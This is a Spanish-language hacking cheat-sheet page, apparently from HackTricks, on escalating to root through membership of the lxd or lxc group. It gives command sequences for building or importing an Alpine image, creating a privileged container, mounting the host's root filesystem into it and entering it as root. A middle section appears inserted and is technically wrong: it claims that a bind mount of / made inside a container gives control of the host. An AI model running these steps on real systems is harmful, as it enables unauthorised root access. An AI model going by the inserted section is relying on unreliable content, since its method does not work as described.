<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Consigue la [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)

- **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


Si perteneces al grupo _**lxd**_ **o** _**lxc**_, puedes convertirte en root

# Explotando sin internet

Puedes instalar en tu máquina este constructor de distribuciones: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)\(sigue las instrucciones del github\):
```bash
#Install requirements
sudo apt update
sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools
#Clone repo
go get -d -v github.com/lxc/distrobuilder
#Make distrobuilder
cd $HOME/go/src/github.com/lxc/distrobuilder
make
cd
#Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
#Create the container
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml
```
Entonces, sube al servidor los archivos **lxd.tar.xz** y **rootfs.squashfs**

Agrega la imagen:
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image list #You can see your new imported image
```
# Escalación de privilegios en LXD

## Introducción

LXD es un sistema de contenedores de Linux que permite a los usuarios crear y administrar contenedores de sistema operativo. Aunque LXD está diseñado para ser seguro por defecto, existen algunas configuraciones que pueden permitir a un usuario con acceso a un contenedor escalar sus privilegios y obtener acceso de root en el host.

## Escalación de privilegios

### Crear un contenedor y agregar una ruta de root

Para crear un contenedor y agregar una ruta de root, primero debemos crear un contenedor y luego agregar una ruta de root al contenedor. Para hacer esto, podemos usar los siguientes comandos:

```bash
$ lxc launch <image> <container>
$ lxc exec <container> /bin/sh
# mkdir /mnt/root
# mount --bind / /mnt/root
# exit
```

Esto creará un contenedor y agregará una ruta de root al contenedor. Luego, podemos iniciar sesión en el contenedor y cambiar el directorio raíz a la ruta de root que acabamos de agregar:

```bash
$ lxc exec <container> /bin/sh
# chroot /mnt/root
# id
uid=0(root) gid=0(root) groups=0(root)
```

Ahora estamos dentro del contenedor con privilegios de root. Podemos hacer lo que queramos en el host, incluyendo la creación de nuevos usuarios, la modificación de archivos de configuración y la instalación de software malicioso.

## Conclusiones

LXD es una herramienta poderosa para la creación y administración de contenedores de Linux, pero es importante tener en cuenta las configuraciones que pueden permitir la escalación de privilegios. Al seguir las mejores prácticas de seguridad y mantenerse actualizado con las últimas actualizaciones de seguridad, los usuarios pueden minimizar el riesgo de una violación de seguridad.
```bash
lxc init alpine privesc -c security.privileged=true
lxc list #List containers

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
Ejecutar el contenedor:
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
# Con internet

Puedes seguir [estas instrucciones](https://reboare.github.io/lxd/lxd-escape.html).
```bash
lxc init ubuntu:16.04 test -c security.privileged=true
lxc config device add test whatever disk source=/ path=/mnt/root recursive=true 
lxc start test
lxc exec test bash
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
# Otras referencias

{% embed url="https://reboare.github.io/lxd/lxd-escape.html" caption="" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)

- **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) **grupo de Discord** o al [**grupo de telegram**](https://t.me/peass) o **sígueme en** **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
